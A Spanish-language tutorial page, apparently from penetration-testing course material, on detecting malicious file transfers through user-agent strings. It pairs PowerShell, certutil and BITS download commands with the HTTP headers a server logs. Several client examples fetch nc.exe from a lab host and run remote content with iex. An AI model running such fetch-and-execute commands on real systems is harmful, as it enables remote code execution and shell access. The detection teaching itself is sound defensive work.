# Detection

La detección de comandos en la línea de comandos basada en listas negras es fácil de evadir, incluso utilizando obfuscación básica de mayúsculas y minúsculas. Sin embargo, aunque el proceso de crear una lista blanca de todas las líneas de comando en un entorno específico es inicialmente lento, es muy robusto y permite una detección rápida y alertas sobre cualquier línea de comandos inusual.

La mayoría de los protocolos cliente-servidor requieren que el cliente y el servidor negocien cómo se entregará el contenido antes de intercambiar información. Esto es común en el protocolo **HTTP**. Existe la necesidad de interoperabilidad entre diferentes servidores web y tipos de navegadores para asegurar que los usuarios tengan la misma experiencia sin importar su navegador. Los clientes HTTP son identificados principalmente por su **cadena de agente de usuario** (user agent string), que el servidor utiliza para identificar qué cliente HTTP se está conectando, como Firefox, Chrome, etc.

Los agentes de usuario no solo se utilizan para identificar navegadores web, sino que cualquier cosa que actúe como cliente HTTP y se conecte a un servidor web mediante HTTP puede tener una cadena de agente de usuario (por ejemplo, **cURL**, un script personalizado en **Python**, o herramientas comunes como **sqlmap** o **Nmap**).

Las organizaciones pueden tomar medidas para identificar posibles cadenas de agentes de usuario maliciosas construyendo una lista de agentes de usuario legítimos conocidos, agentes de usuario utilizados por procesos predeterminados del sistema operativo, agentes comunes utilizados por servicios de actualización (como **Windows Update** y actualizaciones de antivirus, etc.). Estos se pueden alimentar en una herramienta **SIEM** utilizada para **caza de amenazas** (threat hunting) para filtrar el tráfico legítimo y centrarse en anomalías que puedan indicar comportamiento sospechoso. Cualquier cadena de agente de usuario sospechosa puede investigarse para determinar si fue utilizada para realizar acciones maliciosas.

Un sitio web útil para identificar cadenas comunes de agentes de usuario es [este sitio](https://useragents.io/). Una lista de cadenas de agentes de usuario está disponible aquí.

Las transferencias de archivos maliciosas también pueden detectarse mediante sus cadenas de agentes de usuario. A continuación, se muestran algunos ejemplos de agentes de usuario y encabezados observados en técnicas comunes de transferencia HTTP (probadas en **Windows 10, versión 10.0.14393**, con **PowerShell 5**).

### **Invoke-WebRequest - Cliente**

```bash
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

### **Invoke-WebRequest - Servidor**

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

### **WinHttpRequest - Cliente**

```bash
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

### **WinHttpRequest - Servidor**

```
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### **Msxml2 - Cliente**

```bash
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

### **Msxml2 - Servidor**

```
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

### **Certutil - Cliente**

```bash
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

### **Certutil - Servidor**

```
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

### **BITS - Cliente**

```bash
bashCopiar códigoPS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t;
PS C:\htb> iex $r
```

### **BITS - Servidor**

```
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

Esta sección es solo una introducción sobre cómo detectar transferencias de archivos maliciosas. Sería un excelente punto de partida para cualquier organización crear una **lista blanca** de binarios permitidos o una **lista negra** de binarios conocidos por ser utilizados con fines maliciosos. Además, buscar cadenas de agentes de usuario anómalas puede ser una excelente manera de detectar un ataque en progreso. Cubriremos técnicas de caza de amenazas y detección en profundidad en módulos posteriores.
